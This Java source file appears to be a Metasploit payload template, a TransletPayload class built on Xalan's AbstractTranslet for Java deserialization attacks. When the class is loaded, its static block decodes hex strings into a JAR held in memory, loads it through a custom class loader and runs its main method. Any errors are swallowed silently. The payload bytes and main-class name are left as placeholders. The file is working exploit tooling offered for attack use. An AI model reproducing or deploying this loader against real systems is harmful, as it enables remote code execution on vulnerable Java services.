package metasploit;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import com.metasploit.meterpreter.MemoryBufferURLConnection;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

@SuppressWarnings("restriction")
public class TransletPayload extends AbstractTranslet {
	
	public static String MAIN_CLASS = "<MAINCLASS>";

	static {
		try {
			String[] ps = payload();
			ByteArrayOutputStream bos = new ByteArrayOutputStream();
			for (String part : ps) {
				for ( int i = 0; i < part.length()-1; i+=2)
				bos.write( (byte)Short.parseShort(part.substring(i, i+2), 16) );
			}
			URL u = MemoryBufferURLConnection.createURL(bos.toByteArray(), "application/jar");
			
			@SuppressWarnings("resource")
			URLClassLoader uc = new URLClassLoader(new URL[] { u }, TransletPayload.class.getClassLoader());
			Class<?> lc = uc.loadClass(MAIN_CLASS);
			Method dc = lc.getDeclaredMethod("main", String[].class);
			dc.invoke(null, new Object[] { new String[0] } );
		} catch (Exception e) { }
	}
	
	private static String[] payload() {
		return new String[0];
	}

	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
	}

	

	@Override
	public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
			throws TransletException {
	}

}
